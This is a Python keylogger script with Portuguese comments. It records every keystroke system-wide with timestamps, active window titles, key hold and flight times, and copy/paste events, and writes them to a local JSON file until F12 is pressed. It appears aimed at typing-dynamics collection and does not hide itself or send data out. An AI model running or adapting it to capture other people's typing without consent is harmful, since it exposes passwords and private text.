from pynput import keyboard
import json
from datetime import datetime
import os
import time
import sys
import platform

class Keylogger:
    def __init__(self):
        self.log_file = "keylog.json"
        self.keys_pressed = []
        self.start_time = datetime.now()
        self.last_key_time = None
        self.key_press_times = {}  # Para armazenar o tempo de início do pressionamento
        self.special_commands = {
            keyboard.Key.ctrl_l: False,
            keyboard.Key.ctrl_r: False,
            keyboard.Key.cmd: False,
            keyboard.Key.cmd_r: False,
            keyboard.Key.alt_l: False,
            keyboard.Key.alt_r: False,
            keyboard.Key.shift: False,
            keyboard.Key.shift_r: False,
        }
        self.running = True
        self.system = platform.system()

    def on_key_press(self, key):
        # Verifica se F12 foi pressionado para sair
        if key == keyboard.Key.f12:
            print("\nFinalizando o keylogger...")
            self.running = False
            return False  # Isso para o listener

        current_time = time.time()
        
        # Registra o tempo de início do pressionamento
        self.key_press_times[key] = current_time
        
        # Calcula o flight time (tempo entre teclas)
        flight_time = None
        if self.last_key_time is not None:
            flight_time = current_time - self.last_key_time
        
        # Atualiza o estado dos modificadores
        if key in self.special_commands:
            self.special_commands[key] = True
        
        # Detecta comandos especiais
        command_type = None
        if self.special_commands[keyboard.Key.ctrl_l] or self.special_commands[keyboard.Key.ctrl_r]:
            if hasattr(key, 'char') and key.char == 'v':
                command_type = "paste"
            elif hasattr(key, 'char') and key.char == 'c':
                command_type = "copy"
            elif hasattr(key, 'char') and key.char == 'x':
                command_type = "cut"
        
        if key == keyboard.Key.backspace:
            command_type = "backspace"
        elif key in [keyboard.Key.left, keyboard.Key.right, keyboard.Key.up, keyboard.Key.down]:
            command_type = "cursor_movement"

        try:
            key_char = key.char
        except AttributeError:
            key_char = str(key)

        key_data = {
            "key": key_char,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "application": self.get_active_window(),
            "flight_time": round(flight_time, 3) if flight_time is not None else None,
            "command_type": command_type
        }
        
        self.keys_pressed.append(key_data)
        self.last_key_time = current_time
        self.save_to_json()

    def on_key_release(self, key):
        current_time = time.time()
        
        # Calcula o hold time (tempo que a tecla ficou pressionada)
        if key in self.key_press_times:
            hold_time = current_time - self.key_press_times[key]
            
            # Atualiza o último registro com o hold time
            if self.keys_pressed:
                self.keys_pressed[-1]["hold_time"] = round(hold_time, 3)
                self.save_to_json()
            
            # Remove o registro do tempo de pressionamento
            del self.key_press_times[key]
        
        # Atualiza o estado dos modificadores
        if key in self.special_commands:
            self.special_commands[key] = False

    def get_active_window(self):
        try:
            if self.system == "Darwin":  # macOS
                from AppKit import NSWorkspace
                active_app = NSWorkspace.sharedWorkspace().activeApplication()
                return active_app['NSApplicationName']
            elif self.system == "Windows":
                import win32gui
                window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                return window
            elif self.system == "Linux":
                try:
                    import subprocess
                    cmd = 'xdotool getwindowfocus getwindowname'
                    window = subprocess.check_output(cmd, shell=True).decode('utf-8').strip()
                    return window
                except:
                    return "Unknown"
            else:
                return "Unknown"
        except:
            return "Unknown"

    def save_to_json(self):
        with open(self.log_file, 'w', encoding='utf-8') as f:
            json.dump(self.keys_pressed, f, indent=4)

    def start(self):
        print("Keylogger iniciado. Pressione F12 para finalizar.")
        with keyboard.Listener(
            on_press=self.on_key_press,
            on_release=self.on_key_release
        ) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start() 
    